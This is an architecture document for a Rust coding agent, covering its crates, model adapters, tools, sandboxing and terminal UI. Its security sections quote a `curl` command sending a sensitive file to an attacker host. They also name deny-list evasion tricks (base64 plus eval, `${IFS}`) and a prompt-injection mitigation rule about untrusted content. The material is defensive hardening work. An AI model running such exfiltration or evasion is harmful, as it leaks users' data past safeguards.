# KirkForge Architecture

KirkForge is a provider-agnostic, verification-first coding agent. It combines
semantic code understanding, token-budget management, context compression, and
deterministic verification into a single Rust binary with an interactive TUI.

This document ties the pieces together. It is the map; the ADRs in
[docs/adr/](docs/adr/) are the pinned decisions.

---

## Identity

KirkForge is not "Claude Code with more providers" or "Vix in Rust." It is a
synthesis with its own architectural contributions:

| Concern | KirkForge's answer |
|---|---|
| Provider lock-in | One `ModelAdapter` trait, six concrete providers (Ollama, OpenAI-compat, Anthropic direct, Bedrock, Vertex, OpenCode-Zen). Model-name routing heuristics pick the adapter; config overrides win. |
| Context quality | Tree-sitter symbol/import/call-graph index (`kf-context-index`) gives the agent graph-grounded retrieval instead of plain-text search. Four languages: Rust, TypeScript, Python, Go. |
| Context cost (input side) | Stratum compression pipeline classifies and compacts bloated tool outputs *before* they enter the context window. |
| Context cost (output side) | Budget guard (`kf-budget-core`) tracks token spend against a ceiling and slices or compacts oversized tool results when the budget is approached. |
| Execution reliability | A verifier bus runs build, test, lint, rustfmt, git-state, and security checks after file-modifying tool calls. A correction loop auto-applies rustfmt fixes; build/lint/test findings are fed back to the model as tool-result suggestions. |
| Reproducibility | Enforced plan mode (`/plan` then `/implement`), per-result checkpointing mid-batch, execution replay (ADR-039), and conversation logging. |
| Extensibility | A manifest-based plugin system (`kf-code.toml`) with trust tiers, minisign signature verification, and four capability kinds: skills, tools, hooks, verifiers. |

---

## Workspace layout

The workspace has one binary crate (`kf-code`) and 10 satellite crates under
`crates/`. The binary is the user-facing CLI; the satellites are libraries and
standalone binaries.

```
kf-code (root bin)          ← the CLI the user runs
├── src/                       ← agent core (session, tools, TUI, adapters, verifiers)
├── crates/                    ← 10 satellite crates
│   ├── kf-plugin-host  ← plugin runtime + SDK (manifest types, trust tiers folded in, WO 47.4): registry, dispatch, signatures
│   ├── kf-context-index← tree-sitter symbol/import/call-graph index
│   ├── kf-workflow     ← programmable JSON workflow engine
│   ├── kf-lsp          ← LSP client pool for symbol-aware navigation
│   ├── kf-bench        ← task-benchmark harness (types + verifier + reports)
│   ├── kf-compress-core       ← context-compression pipeline library + ruleset filtering
│   ├── kf-budget-core           ← budget/orchestrator/slicing data model
│   ├── kf-rbac                 ← RBAC (4 roles × 16 perms), timing-safe API-key auth — port of @kirkforge/core-rbac (WO 29.5; dead JWT/JWKS half deleted WO 47.3)
│   ├── kf-orchestrator ← orchestrator delegation + decompose + correction pipeline + mode executors (trait-based ModelClient seam) — port of @kirkforge/orchestrator (WO 29.7); absorbed kf-routing (`routing` module) + kf-memory-store (`memory` module) in WO 47.4
│   └── kf-testdoctor   ← test-performance doctor (workspace member; profile, profile-per-test, classify, partition, suggest, suggest-detailed, apply, gaps, diagnose, flaky)
├── benches/tasks/             ← 30 benchmark task definitions (TOML)
└── docs/adr/                  ← 94 Architecture Decision Records
```

 The workspace has ~5,100 test functions (~4,110 under `src/`,
 ~1,005 under `crates/`). The `crates/` `#[test]` count is pinned by
 the `readme_drift` test (`crates/kf-budget-core/README.md` State table).

### Compiled-in vs satellite

The root `kf-code` binary directly depends on eight crates in a default
build (plus two more behind `devtools`):

| Crate | Role |
|---|---|
| `kf-plugin-host` | Plugin SDK (manifest types, trust tiers — folded in, WO 47.4), registry, dispatch, in-process signature verification (ADR-057) |
| `kf-context-index` | Tree-sitter indexing and graph retrieval |
| `kf-workflow` | JSON workflow engine (reuses the `task` tool's spawner) |
| `kf-lsp` | LSP client pool |
| `kf-orchestrator` | Delegation/decompose/correction pipeline; `ModelClient` impl + security verifier (WO 35.6) |
| `kf-rbac` | Daemon bearer-token authz (WO 43.6, `KF_CODE_DAEMON_ROLE`); RBAC 4 roles × 16 perms, timing-safe API-key auth |
| `kf-bench` | Benchmark task types, loader, verifier, report writers (devtools-gated, WO 47.5) |
| `kf-testdoctor` | Test-coverage diagnostics behind `kf-code doctor` (devtools-gated, WO 47.5; own `kf-testdoctor` bin builds always) |

 The remaining crates are **satellites**: they compile in behind Cargo
 features. `kf-compress-core` and `kf-budget-core` build behind the
 `stratum` / `budget` features (ADR-046/047); the feature-off path
 registers no Stratum/Budget tools or hooks (no shell fallback exists —
 the former shell-plugin trees were deleted in WO 29.9). (WO 47.4 folded
 `kf-routing` + `kf-memory-store` into `kf-orchestrator` as the
 `routing`/`memory` modules, and `kf-plugin-sdk` into `kf-plugin-host`
 as the `sdk` module, removing three workspace members with single
 consumers.)

**Release-binary cost of the orchestrator chain (WO 36.1, 2026-08-19).**
Measured in one worktree (`cargo build --release -p kf-code`, packaged
like `release.yml`'s tar.gz): with the WO 35.6 `kf-orchestrator` dep
20,619,832 bytes raw / 7,322,987 bytes tar.gz; with the dep removed
20,603,448 / 7,317,485 — a 16,384-byte (0.08%) cost, far under the ~5%
 gate, so the dep stays ungated. The chain is
 `kf-orchestrator → rusqlite` (bundled SQLite C, via the folded `memory`
 module), but
nothing in the binary constructs `SqliteAdapter` (kf-code's `remember`
tool uses its own JSON-file `shared::memory::MemoryStore`, a different
type), so fat LTO + `opt-level = "z"` drops the unreachable SQLite code
and the linker never pulls the bundled C objects. Re-measure if a
binary code path starts calling the memory module's
`MemoryStore::open`/`SqliteAdapter`.

### Crate map

| Crate | Owner | Purpose | Status |
|-------|-------|---------|--------|
| `kf-plugin-host` | session | Plugin registry, dispatch, signatures + SDK manifest types/trust tiers (folded from `kf-plugin-sdk`, WO 47.4) | Active |
| `kf-context-index` | session | Tree-sitter symbol/import/call-graph index | Active |
| `kf-workflow` | session | JSON workflow engine (DAG of persona steps) | Active |
| `kf-lsp` | tools | LSP client pool for symbol-aware navigation | Active |
| `kf-bench` | session | Benchmark task types, loader, verifier, reports | Active |
| `kf-compress-core` | session | Context-compression pipeline library + rules | Active |
| `kf-testdoctor` | quality | Test-performance diagnostics | Active |
| `kf-budget-core` | session | Budget/orchestrator/slicing data model | Active |
| `kf-rbac` | security | RBAC (roles/permissions/actor), timing-safe API-key auth — port of `@kirkforge/core-rbac` (WO 29.5). Dead JWT/JWKS half deleted in WO 47.3 (zero production consumers; daemon uses token + role via `actor_from_api_key`). | Active |
| `kf-orchestrator` | session | Orchestrator delegation + decompose + correction pipeline + mode executors (trait-based ModelClient seam) — port of `@kirkforge/orchestrator` (WO 29.7). `ModelClient` production impl: `src/session/executor_adapter.rs` (WO 35.6, ADR-075). Reducer folds verification state into `DelegationResult.packet` (WO 37.2, ADR-076); deterministic lint/types/graph verifiers still deferred. Absorbed `kf-routing` (pure modules, WO 29.3) + `kf-memory-store` (memory facade, WO 29.6) as the `routing`/`memory` modules in WO 47.4. | Active |

"Excluded" crates exist on disk but are not built by default.

---

## The agent core (`src/`)

The binary's source is organized into eight top-level modules:

### `session/` — the agent loop

The largest module (~37 submodules). It owns:

- **Executor** (`executor/`): the turn loop. Dispatches tool calls (serial or
  parallel batches per ADR-0020), collects stream events, emits plan-reason
  trace events (ADR-0032), checkpoints after each tool result (ADR-0034).
  **Dispatch no-throw contract (WO 43.16)**: the dispatch hub
  (`executor/dispatch.rs`) is Result-typed end-to-end — `prepare_batch`,
  `spawn_batch`, `collect_batch` all return `anyhow::Result`. Tool bodies are
  wrapped in `AssertUnwindSafe(...).catch_unwind()` under timeout, so a
  panicking tool becomes `ToolOutcome::Failure(ToolError::Internal { "tool
  panicked: …" })` instead of unwinding through the executor loop — in unwind
  builds (dev/test; the `test_panicking_tool_yields_failure_internal` pin
  runs there). In release (`panic = "abort"`) the guard
  never fires: the process aborts and the WO 38.2 panic hook restores the
  terminal (WO 47.23 contract; see the "Panic containment + terminal
  survival" note in the TUI section). A
  `JoinError` (spawned task panicked/cancelled) leaves the index unrecorded
  and Phase 3 appends a placeholder result. The three remaining reachable
  panic sites in dispatch-reachable code were converted to guarded branches:
  the Phase-2.5 deferred-file `expect` is a `Failure(Internal)` outcome, the
  `stratum_store` local invariant uses `unwrap_or_else` + `tracing::error!` +
  skip, and the `build_task_spawner` RwLock read uses the repo's poison
  pattern (`.unwrap_or_else(|e| e.into_inner())`). A grep gate in
  `scripts/ci-local.sh` rejects new non-test `unwrap`/`expect`/`panic!` in
  `dispatch.rs`.
- **Verifiers** (`verifier/`): the verification bus and correction loop (see
  [Verification](#verification)).
- **Plugin tools** (`plugin_tools/`): loads plugin manifests. External plugins
   are wrapped in `PluginToolWrapper` (implements the `Tool` trait, spawns the
   shell script as a subprocess). Folded plugins (Stratum, Budget)
   register as direct Rust `Tool` impls when their feature is on (ADR-050).
   Workspace plugins (`plugin_sources`) are NOT trusted by default: a model
   with `write_file` access can drop a plugin + manifest into a workspace
   path, so signature verification on workspace plugins is enforced unless
   the operator opts in via `plugin_trust_workspace = true` (H10 / WO 27.4).
   Data-dir plugins use the global `plugin_signature_validation` toggle.
   The content-hash consent ledger (`plugin_consent_ledger`, default on
   since WO 46.13) layers on top of signature verification: a signed
   plugin must ALSO be ledger-approved with a matching `bundle_hash`
   (which covers manifest + command scripts). The manifest-only
   signature does not cover the scripts the manifest points to; the
   ledger does. Set `plugin_consent_ledger = false` to opt out.
- **Plugin ops** (`plugin_ops.rs`): shared plugin-ops layer used by both the
  TUI `/plugins` slash-command family and the `kf-code plugin` CLI
  subcommand (`list`, `enable`, `disable`, `toggle`, `validate`, `reload`,
  `sources`, `add`, `remove`, `doctor`). Pure functions over `&Config` /
  `&mut Config`; the TUI keeps its `mpsc` reload plumbing, the CLI mutates
  the config and prints "restart to apply" (ADR-056, WO 11.0).
- **Hooks** (`hooks.rs`): fires plugin hooks on lifecycle events
  (`session-start`, `post-turn`, `pre-tool-bash`, `post-tool-bash`,
  `post-tool-write_file`, `pre-compact`, `post-compact`). Folded plugins
  register
  `InProcessHook` handlers that run in-process with full `HookContext`
  (including tool result content). External plugins use shell scripts.
  Pre-tool hooks gate exactly once per call, in the Phase-1 pre-gate with
  the resolved path already substituted for file tools — `record_tool_result`
  (Phase 3) never re-runs them, so a deny always lands before the mutation
  (WO 43.30 / WO 48.2).
- **Prompt** (`prompt/`): builds the model prompt from conversation history,
  system instructions, tool definitions, and retrieved context. Includes
  microcompaction (ADR-0027) for stale turns.
- **Router** (`router.rs`): routes tool calls to built-in tools or plugin tools.
- **Skills** (`skills.rs`): slash-command prompts backed by plugins or built-in
  personas (`/explore`, `/plan`, `/coder`).
- **Config** (`config/`): TOML config parsing, env overrides, live-reload diff.
- **Bench** (`bench.rs`): headless session executor for benchmark tasks.
- **Replay** (`replay.rs`): execution replay for debugging (ADR-039).

### Streaming tool-call protocol (`call_id`, WO 48.31)

Parallel same-name tool calls need disambiguation on the event stream, so
the executor stamps every streaming tool event with the model-assigned
call id (`ToolInvocation.id`): `TurnEvent::ToolStart`, `ToolResult`, and
`BashPartialOutput` all carry a `call_id` field
(`executor/types.rs`). The TUI routes chunks and placeholder
finalization through `ConversationState.streaming_tool_index` — a
call_id → message-index map, rebased on mid-deque removal and prune — so
parallel bash calls never mix cards. Events with an empty `call_id` (old
replay traces, synthetic results without an invocation) fall back to the
pre-48.31 name-based pairing; protocol consumers should treat empty as
"pair by name."

### `adapters/` — provider abstraction

One file per provider plus shared body builders and retry logic. The
`ModelAdapter` trait is the only seam the session layer sees:

```rust
#[async_trait]
pub trait ModelAdapter: Send + Sync {
    fn model_info(&self) -> ModelInfo;
    async fn stream(&self, messages: &[Message], tools: &[ToolDef])
        -> anyhow::Result<Receiver<StreamEvent>>;
}
```

Provider selection: config `model_type_override` wins; otherwise model-name
prefix heuristics (`claude-*` → Anthropic, `glm*`/`deepseek*`/`gemini*`/`kimi*`
→ Ollama-kind, `opencode/` → OpenCode-Zen, else → OpenAI-compat). The `provider`
field selects the Anthropic cloud backend (direct, Bedrock, or Vertex).

**Per-provider base URLs** (WO 44.22): the first-party Anthropic adapter uses
`[model].anthropic_api_base` (default `https://api.anthropic.com`) — not the
shared `ollama_host`. This prevents the `x-api-key` header from being
transmitted to whatever owns port 11434 when `ollama_host` defaults to
`http://localhost:11434`. The OpenAI-compat adapter trims a trailing `/v1`
from the base URL after stripping slashes, so both `http://host:11434` and
`http://host:11434/v1` (Ollama's documented compat base) produce
`/v1/chat/completions` rather than `/v1/v1/chat/completions`. The long-term
shape is per-provider bases for every adapter kind; this WO adds the first
(`anthropic_api_base`), the openai_compat de-dup is a localized fix.

**Per-provider API key resolution** (`adapters/auth.rs`): each adapter resolves
its API key via `resolve_api_key(provider, config_key)`, which returns the first
non-empty value from: (1) the config field (`[model].anthropic_api_key`, etc.),
(2) the standard env var (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, etc.), (3)
keychain (stubbed to `None`; Series 18). The Anthropic adapter sends the key as
`x-api-key` and returns a clear error before any HTTP request if no key is
available. The OpenAI-compat adapter threads `[model].openai_api_key` the same
way (WO 38.5) — hosted endpoints authenticate per request; local servers keep
working keyless (no `Authorization` header). Keychain/OAuth expansion is
planned for Series 18.

**Stream semantics** (WO 38.5): the Anthropic SSE parser accumulates usage
across frames — `message_start` carries the input side, `message_delta` the
final `output_tokens`; `message_stop` prefers its own (non-conforming) value if
present. `TokenUsage` gained `cache_write_tokens` (Anthropic
`cache_creation_input_tokens`), billed additively at the write rate. The
OpenAI-compat body now sends `stream_options: {include_usage}` and the parser
holds `Done` until the post-finish usage frame or `[DONE]` so the trailing
usage is not dropped. A channel close without a terminal event is truncation,
not success, on every adapter: the parser emits `Done{Error}` and the executor
mirrors the cancel path (persist the partial assistant message + placeholder
tool results) instead of laundering a half-reply into a completed turn.

**Pricing** (`shared::PRICING_TABLE`, WO 38.5): rows for real Anthropic model
ids (`claude-sonnet-4`, `claude-opus-4`, `claude-3-5-*`, `claude-3-*`); Bedrock
ids (`anthropic.claude-*`) are matched after stripping the `anthropic.`
namespace; longest-prefix wins; legacy short prefixes (`opus-4`…) kept for
back-compat. Config-driven `[price_overrides."<prefix>"]` override the table
(longest prefix wins) so self-hosted models can be priced without a code
change. An unmapped model falls to the $0 sentinel with a once-per-model WARN
instead of a silent $0.

**Response cache** (`adapters/caching.rs`, WO 38.5): a stream carrying any
`Error` event — or ending in `Done{Error}` — is never cached, so a transport
blip can't poison the cache and replay the error forever. Replay zeroes the
`Done` usage so a cache hit does not re-bill the original turn's tokens in
`CostStats`.

**Zero-arg tool calls** (WO 38.5): the Anthropic `content_block_stop` handler
flushes a pending `tool_use` unconditionally — a block with no `partial_json`
deltas is a zero-argument call, not a dropped one (`into_invocation` maps the
missing input to `json!({})`). The OpenAI-compat accumulator emits a named
call with empty argument deltas as a single `json!({})` invocation instead of
error-looping on "no parseable tool calls".

**Bedrock envelope** (`adapters/anthropic_bedrock.rs`, WO 38.5): the
event-stream payload extraction operates on raw bytes — `serde_json`'s
`Deserializer::from_slice` finds the first `{` and reports `byte_offset()` in
byte space, so non-UTF8 preludes (binary event-stream headers, CRCs) cannot
shift offsets and corrupt frame boundaries.

### `tools/` — built-in tools

20 tools implementing the `Tool` trait (17 always registered + 3 conditional),
registered in `all_tools()` (`src/tools/mod.rs`): `read_file`, `write_file`,
`edit_file`, `notebook_edit`, `bash`, `bash_status`, `bash_cancel`, `grep`,
`glob`, `web_fetch`, `web_search`, `task`, `task_output`, `workflow_run`,
`todo_write`, `todo_read`, `remember` are always registered; `read_image`
(when `supports_images`), `lsp_query` (when an LSP pool is configured), and
`computer_use` (when enabled with image support + config) are conditioned on
their capability flags in `ToolContextBuilder`. (`atomic_write` and
`bash_minify` are internal helper modules, not model-facing tools.) The
`workflow_run` tool (WO 9.1) wraps the `kf-workflow` crate's `WorkflowExecutor`
so the agent loop and bench harness can invoke workflows via tool calls,
reusing the same in-process `TaskSpawner` as the `task` tool. Plugin tools are
registered alongside these at runtime.

**Windowed reads (WO 48.33):** a `read_file` call with `offset > 0` and a
`limit` stops scanning once the window is filled — the file is streamed
line by line and only the `[offset, offset+limit)` window is held, so a
multi-GB file read with a small window no longer sits in memory in full.
The true line total past a filled window is reported as unknown
(`N+` display); `offset = 0` keeps the full scan.

**Cancel-aware fallback walkers (WO 48.34):** when the tree-sitter /
ripgrep fast paths are unavailable and `glob`/`grep` fall back to their
own directory walks, the walk body checks the tool's cancel flag per
directory entry and returns `Cancelled` promptly instead of walking to
completion — Esc during a large fallback search stops within one entry.

The `bash` tool has three isolation layers: Docker execution mode
(`--docker`, ADR-036) for full container isolation, lightweight rlimit
hardening (`--harden`, ADR-054) for the non-Docker path, and Linux landlock
filesystem confinement (WO 27.1, default-on for Linux, fail-closed, applied
via the same `pre_exec` hook as the rlimits — not a Cargo feature). The
`--harden` flag applies `RLIMIT_CPU` / `RLIMIT_AS` / `RLIMIT_FSIZE` to
the child shell in a `pre_exec` hook (Unix only; Windows no-op with a
warning). It is ignored when `--docker` is set (Docker already enforces
`--memory` and `--cpus`). An optional fourth layer — a seccomp-bpf syscall
filter (WO 30.4) — confines the syscall surface to an allowlist (everything
else fails with `EPERM`); it is default-OFF behind the `seccomp` Cargo
feature and applied last in the same `pre_exec` hook, after landlock. See
`src/session/bash_runner/seccomp.rs`.

**Security posture — tripwire vs boundary (WO 28.17 R1):** the bash
deny-list + dangerous-pattern scan (`src/shared/bash_safety.rs`) is a
**tripwire**, not a boundary. It narrows the obvious-payload surface and
catches naive evasion (`${IFS}`, `$()`, backticks), but a determined payload
evades via encoding (base64/hex + eval) or variable indirection — no
substring/regex blocklist can resolve runtime state. The **boundary** is
landlock filesystem confinement (caps the blast radius to allow-listed
paths) plus `--no-network` (`unshare(CLONE_NEWNET)`, blocks exfiltration).
 Do not mistake the deny-list for a boundary: it raises the bar for trivial
 payloads, it does not confine. The non-theatrical command gate is an
 allowlist (`bash.require_allowlist`, WO 32.18 — shipped, default-off): when
 enabled, bash commands must match `bash_allowlist` (prefix-match on the
 command head; compound commands require every clause to match) or be
 denied. An allowlist is the only blocklist-shape that isn't theater.

**Untrusted-content delimiters (WO 47.35, honesty + hardening WO 48.35):**
`web_fetch`, `web_search`, and `read_file` wrap their textual output in
`<untrusted_content>` / `</untrusted_content>` tags (shared
`wrap_untrusted` in `src/tools/web_fetch.rs`), and the system prompt pins
a data-not-instructions rule. This is a prompt-injection **mitigation**,
not a trust boundary — permissions, the sandbox stack (landlock /
`--no-network` / Docker), and approval gates remain the authoritative
boundary. Hardening (WO 48.35): payload-borne literal closing tags are
neutralized (`<\/untrusted_content>`) so fetched content cannot terminate
its own untrusted region, and when the central `truncate_tool_output`
cap (`tools.max_tool_result_chars`) would cut the closing tag, the tag is
dropped and the region ends with `...\n[truncated]` instead — an
unterminated region is always the executor's cut, never content forging
an early or missing close.

**WO 38.1 chokepoint hardening:** three classification holes and one env leak
are closed at the shared chokepoints. (1) `is_read_only_bash`
(`executor/helpers`) rejects any command with an embedded `\n`/`\r` — a
newline is a command separator, so nothing multi-line is read-only (plan mode
and explore personas inherit this). (2) Permission rules
(`shared/permission.rs`) evaluate bash `command` rules per compound clause
(`;`/`&&`/`||`/`|`/newline): an Allow/Ask rule matches only when EVERY clause
matches (a `cargo test*` rule no longer authorizes `cargo test; curl …`), and
a Deny rule trips when ANY clause matches (a deny still fires when the payload
hides after a newline). (3) `env`/`printenv` are no longer auto-approved
read-only commands (`ps`/`lsof`/`dmesg` stay), and the bash runner scrubs
credential-shaped vars (`*_API_KEY`/`*_TOKEN`/`*_SECRET`, case-insensitive)
from every child shell env — the `!` passthrough and `/test` share this
runner and are scrubbed too. (4) File-tool bodies open the Phase-1 RESOLVED
path (injected in `executor/dispatch.rs` before the body runs) and a
component symlink-walk re-checks it immediately before the open; the residual
walk-to-open micro-window is documented at the call site (upgrade path:
`openat2(RESOLVE_NO_SYMLINKS)`).

**Operator guidance for unattended runs (WO 27.5 R3):** for headless / CI /
scheduled-job execution, run with `--harden --no-network`. `--no-network` is
the only thing that blocks data exfiltration like
`curl -F f=@sensitive https://attacker.example/` — landlock is FS-only and
the deny-list is a substring tripwire, not a network boundary. `--no-network`
calls `unshare(CLONE_NEWNET)` (Linux only) to place every spawned shell in an
empty network namespace, so no outbound connection can succeed regardless of
what the model emits. Network access stays opt-in per the user-confirmed
design (a tool that legitimately needs `cargo` / `npm` / `git fetch` cannot
run with `--no-network`); the default interactive posture is network-on, the
recommended unattended posture is network-off.

WO 15.3 closed three SSRF / injection surfaces across the networked
tools. (1) The `computer_use` Chrome launcher now passes
`--host-resolver-rules="MAP * ~NOTFOUND, EXCLUDE localhost, EXCLUDE
127.0.0.1"` so a page loaded by `open`/`navigate` cannot `fetch`
internal IPs (e.g. `169.254.169.254`) from inside the browser via
`evaluate` — all DNS except localhost returns NXDOMAIN. (2) `web_fetch`
resolves the URL host via the OS resolver and rejects the request when
any resolved `IpAddr` is loopback / link-local / RFC1918 / RFC4193,
closing the DNS-rebinding door where a public hostname's A record
points at `127.0.0.1`. Literal-IP hosts are not re-resolved (no TOCTOU
on a pinned literal). (3) The `bash` Docker path now canonicalizes the
bind-mount source and rejects a workdir whose path contains `:` (which
Docker would parse as host/container/opts split), and routes the
model-supplied `cmd` through `check_bash_command_str` — the Docker
branch previously skipped the deny-list / dangerous-pattern gate that
the foreground path runs.

WO 38.3 hardened `web_fetch`'s async + SSRF posture: DNS resolution
runs on `spawn_blocking` (a wedged `getaddrinfo` no longer blocks a
runtime worker); resolver errors for non-literal hosts now fail CLOSED
(was fail-open, which existed only so tests could pin DNS inside the
reqwest client — tests now inject an `EmptyResolver` returning
`Ok(vec![])`); and `is_internal_addr`'s V6 arm checks `to_ipv4_mapped()`
so `http://[::ffff:169.254.169.254]/` is denied instead of sailing past
the V6-only checks. The update client and `web_fetch`'s fallback clients
set builder timeouts (30s) so a stalled GitHub connection cannot hang
`/update` or a fetch fallback forever.

### `tui/` — interactive UI

A ratatui-based terminal UI with chat, input, status, search, slash commands,
plugin management, persona switching, session forking/resume, and approval
gates. Drains four event sources (user input, model stream, approval queue,
background-completion channel) in a single loop.

**Async I/O discipline** (WO 38.3): slash-command handlers that do
subprocess/network I/O (`/gh`, `/jobs run-now`, `/commit --push`, `/test`,
`!` direct + approval-Y) never await that work on the event-loop task. Each
dispatch spawns its work (`tokio::spawn`; `/gh`'s sync `gh` CLI calls run on
`spawn_blocking`) and reports the formatted result through a
`BgCmdDone` channel the loop drains alongside the other sources — the
`/workflow run` background pattern applied to slash commands. `test_in_progress`
is set inline at dispatch and cleared when the completion lands. A stalled
`gh api`, a 1-hour job run, `git push`, or a 5-minute `cargo test` leaves the
TUI live (render, Esc, spinner) instead of freezing it.

**Command diet — opt-in extras** (WO 47.13): low-traffic commands are
disabled unless their key is listed in `[display] extra_commands`
(config.toml, default empty = all off; live via `/reload`). Gated:
`/gh` (`"gh"`), `/route` (`"route"`), `/metrics` (`"metrics"`),
`/carryover` (`"carryover"` — display command only, the profile
machinery stays), `/plan` `/explore` `/coder` (`"personas"` — the
persona machinery itself stays ungated; `/workflow` and the doom-banner
Plan action run through it), the `/jobs` cron surface — `schedule`,
`scheduled`, `run-now`, `logs` (`"jobs-schedule"`; the background-bash
`/jobs` surface stays always-on), and `@`-mention expansion +
completion (`"mentions"`; input is sent verbatim when off). Gated
commands are hidden from `/help` and Tab completion and answer with an
enable-hint message when invoked. Deliberately NOT gated: the doom-loop
banner (runaway-loop safety interrupt, not a diet item) and `/implement`
(plan-mode exit). The `EXTRA_KEYS` table in
`src/tui/keys/slash_commands.rs` is the trigger→key map.

The `/help` text is generated from the `COMMANDS` table in
`src/tui/keys/slash_commands.rs` and grouped into sections (Session, Model,
Safety, Workflow, Plugins, Diagnostics) in a fixed order defined by the
`GROUPS` const — adding a command is one row + one match arm, and the
`help_text_groups_cover_all_commands` test enforces that every row carries a
`group` tag.

The TUI also surfaces a **doom-loop warning banner** when the executor detects
the same tool failing the same way 3 turns in a row (the
`DoomLoopTracker` in `src/session/executor/loop_.rs`). The banner offers three
actions — break (cancel the in-flight generation), plan (switch into plan mode
so mutating tools are denied), and continue (dismiss). A successful tool call
resets the tracker so the next failure starts a fresh run. The TUI is purely
reactive: the executor owns the detector and emits a `TurnEvent::DoomLoopDetected`
that the TUI's `dispatch_turn_event` translates into banner state.

**TUI state hygiene** (WO 38.11): the chat render cache
(`ChatRenderCache` on `ConversationState`) is invalidated at every
message-list mutation site — `CompactionReport`, `prune_display_messages`,
and fork-swap (`resume_conversation_log`) — so the panel never serves
stale lines at re-indexed positions. The `thinking_buffer` is bounded
to a 32 KiB tail budget (`trim_thinking_buffer_tail`); the render path
joins + re-wraps only the tail each frame. Streaming PTY tool cards
are capped to a 64 KiB tail with a byte-count marker. Tool streaming
events route by `call_id` (see
[Streaming tool-call protocol](#streaming-tool-call-protocol-call_id-wo-4831)
above). Chat scroll
offset is clamped to `u16::MAX` (`ponytail:` ceiling — ratatui 0.30's
`Paragraph::scroll` takes u16). The doom-loop banner captures keys
above the approval dialog when unacknowledged, matching its z-order.
`TurnEvent::Error` clears stale `continuation`/`streaming` flags. The
approval dialog memoizes its diff on `(tool_name, args JSON,
side_by_side, dialog_width, file mtime)` so it doesn't re-read +
re-diff the file at 8 Hz. `textwrap::fill` width-0 is guarded with
`.max(1)` at all render sites.

**Doom-loop circuit breaker** (WO 23.8): after N cumulative doom-loop hits
(default 1, configured via `doom_loop_max_hits` / `KF_CODE_DOOM_LOOP_MAX_HITS`),
the executor auto-switches to plan mode (emitting `TurnEvent::DoomLoopRemediation`
with `action: "auto_plan_mode"`). Note this circuit-breaker counter (default 1)
is distinct from the warning banner's `DoomLoopTracker::THRESHOLD` of 3
identical errors in a row described above — the banner surfaces the loop, the
circuit breaker takes remediation action. If already in plan mode when the breaker fires,
the turn is halted with an error message (`action: "halt"`). Setting
`doom_loop_max_hits = 0` disables the circuit breaker entirely (pre-WO behavior).
The cumulative hit counter persists across tool types within a session.

`/permissions list | revoke <i> | clear` (WO 14.5) surfaces the permission
rules created by the approval dialog's `[A]lways` key. The pure ops layer
(`src/tui/commands/permissions.rs`) mutates `Config.security.permission_rules`
in place; the TUI match arm persists via `save_config` on `revoke`/`clear`
(`list` is read-only). 1-indexed positions match `/jobs` and `/undo list`.
`list` also emits shadowed-rule diagnostics (WO 41.6): `⚠ Rule #N is shadowed
by rule #M` when an earlier broader-or-equal rule on the same (tool, key)
makes rule N unreachable under first-match-wins. The check is sound but
incomplete — it never false-positives, may miss subset relations not
expressible as "M's glob matches N's pattern string."

The **status bar** (`render_status` in `src/tui/widgets/status.rs`) degrades by
priority on narrow terminals: low-value spans (plugin count, skills, tool-call
counter, Ctrl+T hint) drop before overlapping, while elapsed, cost, and the
`⚠️ UNSANDBOXED` warning stay at all widths. The drop loop re-runs every frame,
so a resize to 40 cols immediately re-evaluates the priority mask.

The `⚠️ UNSANDBOXED` bar flag means exactly "no PathGuard write scope" — it says
nothing about the other sandbox layers. The full picture is the `/status`
**sandbox posture checklist** (WO 35.4): five rows (PathGuard, Landlock,
seccomp, network ns, worktree) rendered from `SandboxPosture::from_config`
(`src/session/sandbox_posture.rs`), a pure config + compile-time-cfg snapshot
(Landlock mirrors the `#[cfg(target_os = "linux")]` module gate, seccomp
`cfg!(feature = "seccomp")`, netns the `harden && no_network` bash-runner gate).
✗ rows carry their enable hint (`build with --features seccomp`,
`pass --no-network`) so the opt-in features are discoverable without reading
Cargo.toml; the checklist is read from the live shared config, so `/reload`
keeps it honest.

`/sessions tree` renders the fork tree as ASCII (read from
`<data_dir>/sessions/forks/<id>/fork.json` via
`session_index::build_fork_tree`). The result is a flat list of roots with
`children` lists; orphan forks (parent not in the session set) are surfaced as
roots so dangling metadata is never silently dropped. The TUI side is in
`src/tui/commands/sessions.rs::tree_sessions_text`.

The input box offers **Tab-completion** (WO 14.6): when the buffer starts with
`/`, Tab completes against the `COMMANDS` primary triggers (prefix match —
readline contract, no fuzzy); when it starts with `@`, Tab completes the path
portion against the filesystem (the `:A-B:raw` suffix is left alone). A single
match replaces the buffer; multiple matches populate
`AppState::conversation.completion_suggestions`, rendered as a one-line dim
hint above the input text. The completion layer is `complete_command` (pure, over `COMMANDS`)
and `complete_path` (`std::fs::read_dir`, capped at 24 entries). The legacy
"Tab on empty input toggles expand/collapse" behavior is preserved when the
buffer doesn't start with `/` or `@`.

The **scout subagent** (Workorder 8.2c) is the in-process, fork-free sibling
of `/explore`. Where `/explore` always spawns a forked executor in a
background task, the scout runs synchronously in the calling task and never
touches the conversation log. The `ScoutSubagent` struct in
`src/session/executor/scout.rs` holds the canonical read-only `SCOUT_TOOLS`
allow-list (`read_file`, `read_image`, `grep`, `glob`) and exposes a
`filter_tools` helper that drops anything not in the list. The persona side
is `tools_for_scout` in `src/tui/commands/persona.rs`. The scout is the
most conservative subagent surface — same read-only tools as the `/plan`
persona, but no `bash` (the bash sandbox adds attack surface that has not
been independently audited).

The **`task`-tool subagents** (`InProcessTaskSpawner` in `src/session/task_spawner.rs`,
WO 28.1) are a separate surface from the scout: each `task` tool call spins up an isolated
`Executor` with a throwaway conversation log and a persona-restricted toolset (`explore` =
read-only + bash, `plan` = read-only research, `coder` = full toolset). Two isolation
controls apply (WO 30): **approval forwarding** — subagent destructive-tool approval requests
are forwarded to the *parent* session's approval channel (set on the spawner from
`Executor::run_turn`), so the user sees and decides them interactively in the TUI / line-mode;
with no parent channel (top-level scheduled job) the P0 policy applies (auto-approve in CI,
deny otherwise). **Worktree isolation** (WO 35.2) — when `session.worktree_enabled` is set, a
`coder` subagent gets its own `git worktree` (branched from the parent sandbox when that is
itself a worktree, else the process CWD) and the cloned config's `sandbox_dir` is pointed at
it before `access_from_config`, so the path guard, landlock extra paths, and the subagent
executor's guard tower all center on the worktree; the executor receives a frozen config
clone, not the live parent shared config. Before the worktree is dropped, uncommitted edits
(tracked + untracked via `git add --intent-to-add`) are captured with `git diff HEAD` and
returned as an appliable patch appended to the task summary, so the parent model can `git
apply` the subagent's work; on an error return the patch is not captured (disclosed ceiling).
